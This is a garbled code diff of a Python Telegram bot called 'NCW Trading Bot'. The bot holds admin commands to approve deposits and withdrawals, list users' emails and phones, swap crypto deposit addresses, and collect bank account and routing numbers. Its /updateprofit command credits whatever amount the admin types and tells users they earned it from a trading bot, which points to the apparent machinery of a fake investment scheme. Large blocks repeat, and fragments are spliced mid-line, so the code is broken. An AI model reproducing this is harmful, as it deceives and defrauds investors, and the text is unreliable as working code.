+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
                 CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'),
                 CallbackQueryHandler(copy_address, pattern='^copy_address_'),
-                CallbackQueryHandler(payment_made, pattern='^payment_made$'),
-                CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'),
-                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
-                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'),
-                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'),
-                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade$'),
+                CallbackQueryHandler(payment_made, pattern='^payment_made:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
